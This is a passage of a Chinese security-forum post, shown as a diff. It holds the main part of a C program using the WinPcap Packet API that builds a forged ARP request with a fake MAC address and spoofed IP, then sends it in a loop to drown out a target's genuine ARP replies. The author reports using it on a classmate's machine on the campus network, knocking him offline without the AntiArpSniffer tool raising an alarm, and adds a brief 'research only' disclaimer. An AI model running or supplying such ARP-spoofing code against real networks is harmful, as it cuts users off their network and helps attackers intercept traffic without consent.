@@ -1,0 +1,90 @@
+
+```
+        for (i=0;i<AdapterNum;i++)
+                wprintf(L"\n%d- %s\n",i+1,AdapterList[i]); //输出获得的所有网络适配器
+
+        printf("\n");
+
+        lpAdapter =   PacketOpenAdapter(AdapterList[0]);   //得到对应网络适配器的_Adapter结构,我
+                                                           //就一个当然是0了
+
+        if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
+        {
+                dwErrorCode=GetLastError();
+                printf("Unable to open the adapter, Error Code : %lx\n",dwErrorCode);
+                return -1;
+        }
+
+        lpPacket=PacketAllocatePacket();                       //得到一个包的_Packet结构
+
+        if(lpPacket==NULL)
+        {
+                printf("alloc lppacket failed");
+                return -1;
+        }
+
+        ZeroMemory(szPktBuf,sizeof(szPktBuf));                //将包的缓存区清空
+
+        arpPacket.ethhdr.dst[0]=0xff;                     //开始填充包结构arpPacket
+        arpPacket.ethhdr.dst[1]=0xff;
+        arpPacket.ethhdr.dst[2]=0xff;
+        arpPacket.ethhdr.dst[3]=0xff;
+        arpPacket.ethhdr.dst[4]=0xff;
+        arpPacket.ethhdr.dst[5]=0xff;
+        arpPacket.ethhdr.src[0]=0x00;                     //一个伪造的MAC地址
+        arpPacket.ethhdr.src[1]=0x20;
+        arpPacket.ethhdr.src[2]=0xce;
+        arpPacket.ethhdr.src[3]=0xa8;
+        arpPacket.ethhdr.src[4]=0x54;
+        arpPacket.ethhdr.src[5]=0x33;
+        arpPacket.ethhdr.type=htons(EPT_ARP);
+        arpPacket.eth_arp.arp_hrd=htons(ARP_HARDWARE);
+        arpPacket.eth_arp.arp_pro=htons(EPT_IP);
+        arpPacket.eth_arp.arp_hln=6;
+        arpPacket.eth_arp.arp_pln=4;
+        arpPacket.eth_arp.arp_op=htons(ARP_REQUEST);
+        arpPacket.eth_arp.arp_sha[0]=0x00;                    //仍然是假的MAC地址
+        arpPacket.eth_arp.arp_sha[1]=0x20;
+        arpPacket.eth_arp.arp_sha[2]=0xce;
+        arpPacket.eth_arp.arp_sha[3]=0xa8;
+        arpPacket.eth_arp.arp_sha[4]=0x54;
+        arpPacket.eth_arp.arp_sha[5]=0x33;
+        arpPacket.eth_arp.arp_spa=inet_addr("10.10.63.123");   //冒充对象的IP
+        arpPacket.eth_arp.arp_tha[0]=0x00;
+        arpPacket.eth_arp.arp_tha[1]=0x00;
+        arpPacket.eth_arp.arp_tha[2]=0x00;
+        arpPacket.eth_arp.arp_tha[3]=0x00;
+        arpPacket.eth_arp.arp_tha[4]=0x00;
+        arpPacket.eth_arp.arp_tha[5]=0x00;
+        arpPacket.eth_arp.arp_tpa=inet_addr("10.10.63.254");   //网关IP
+
+        printf("%d\n",sizeof(arpPacket));
+        memcpy(szPktBuf,(char*)&arpPacket,sizeof(arpPacket));
+        PacketInitPacket(lpPacket,szPktBuf,60);
+
+        while(getchar()!='q')                                     //当输入为q时结束
+        {
+        if(PacketSendPacket(lpAdapter,lpPacket,true)==false)  //不断发送伪造信息，将目标的正确
+                                                              //ARP REQUEST淹没
+                {
+                    printf("error in sending packet");
+                    return -1;
+                }
+        }
+
+        printf("send ok");
+
+        PacketFreePacket(lpPacket);        //一点扫尾的工作
+
+        PacketCloseAdapter(lpAdapter);
+
+    return 1;
+
+}
+```
+
+好了，这个异常简陋的程序结束了，我对我们内部网的某同学测试过，当我程序启动不久，去他寝室看，他已经掉线了，而他的AntiArpSniffer却没有报警，呵呵这说明攻击很成功~。
+
+当然要说明的一点是，这个东西完全是研究学习用，没有恶意，也希望大家不要随便对别人做坏事，恩恩，为了学习研究的目的当然可以做一下实验，但不要太有破坏性哦~（如果你想被一群愤怒的群众痛打，那我也没话说...)。可怜了我那位实验对象 ...找个机会请他吃个饭吧~
+
+[\[招生\]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
